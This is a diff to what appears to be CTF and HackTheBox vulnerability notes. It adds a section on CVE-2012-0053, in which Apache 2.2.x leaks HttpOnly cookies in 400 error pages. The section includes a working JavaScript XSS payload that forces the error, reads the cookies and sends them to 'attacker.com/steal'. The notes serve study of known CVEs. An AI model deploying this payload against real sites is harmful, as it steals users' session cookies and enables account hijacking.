@@ -24,6 +24,7 @@ Specific CVEs and vulnerability patterns. For Node.js CVEs (flatnest, Happy-DOM)
 - [CVE-2024-45409: Ruby-SAML XPath Digest Smuggling (Barrier HTB)](#cve-2024-45409-ruby-saml-xpath-digest-smuggling-barrier-htb)
 - [CVE-2023-27350: PaperCut NG Authentication Bypass + RCE (Bamboo HTB)](#cve-2023-27350-papercut-ng-authentication-bypass--rce-bamboo-htb)
 - [CVE-2024-22120: Zabbix Time-Based Blind SQLi (Watcher HTB)](#cve-2024-22120-zabbix-time-based-blind-sqli-watcher-htb)
+- [CVE-2012-0053: Apache HttpOnly Cookie Leak via 400 Bad Request (RC3 CTF 2016)](#cve-2012-0053-apache-httponly-cookie-leak-via-400-bad-request-rc3-ctf-2016)
 - [Detection Checklist](#detection-checklist)
 
 ---
@@ -287,6 +288,36 @@ Exploits unsanitized `clientip` field in Zabbix trapper protocol to achieve time
 **Key insight:** `\r` (carriage return) in exploit script output can leave visual artifacts. Verify extracted session ID is exactly 32 hex characters before using it.
 
 **Detection:** Zabbix with trapper port 10051 exposed. Audit log functionality enabled.
+
+---
+
+## CVE-2012-0053: Apache HttpOnly Cookie Leak via 400 Bad Request (RC3 CTF 2016)
+
+Apache 2.2.x (before 2.2.22) reflects cookies in 400 Bad Request error pages, bypassing HttpOnly flag protection. Chain with XSS to exfiltrate session cookies.
+
+```javascript
+// XSS payload to trigger Apache 400 error and leak HttpOnly cookies
+// Works on Apache 2.2.0 - 2.2.21
+
+// Step 1: Inflate cookie header to exceed Apache's limit (triggers 400)
+var xhr = new XMLHttpRequest();
+document.cookie = "padding=" + "A".repeat(4000);
+
+// Step 2: Request to the vulnerable Apache server
+xhr.open("GET", "http://target:8080/", true);
+xhr.withCredentials = true;
+xhr.onreadystatechange = function() {
+    if (xhr.readyState == 4) {
+        // 400 response body contains ALL cookies including HttpOnly ones
+        var cookies = xhr.responseText.match(/Cookie:.*$/m);
+        // Exfiltrate to attacker
+        new Image().src = "http://attacker.com/steal?c=" + encodeURIComponent(cookies);
+    }
+};
+xhr.send();
+```
+
+**Key insight:** Apache 2.2.x before 2.2.22 included the full Cookie header in 400 Bad Request HTML responses, including HttpOnly cookies. Combined with XSS on the same origin, this defeats HttpOnly protection entirely. Check server version headers for vulnerable Apache instances.
 
 ---
 
